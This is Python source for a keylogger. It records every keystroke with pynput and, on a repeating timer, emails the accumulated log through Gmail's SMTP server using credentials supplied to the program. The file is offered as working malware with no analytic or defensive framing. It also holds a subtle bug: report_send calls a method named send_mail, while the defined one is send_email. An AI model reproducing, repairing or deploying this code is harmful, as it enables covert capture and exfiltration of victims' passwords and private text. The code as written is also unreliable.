import smtplib
import threading
from pynput import keyboard

# Create Keylogger class
class KeyLogger:

    # Define __init__ variables
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger started..."
        self.email = email
        self.password = password

    # Create a log that all keystrokes will be appended to
    def append_log(self, string):
        self.log +=  string

    # Create keylogger_project
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)

    # Create underlying structure that will send emails
    def send_email(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Create, report and send email
    def report_send(self):
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_send)
        timer.start()

    # Start keyLogger_project and send emails
    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_send()
            keyboard_listener.join()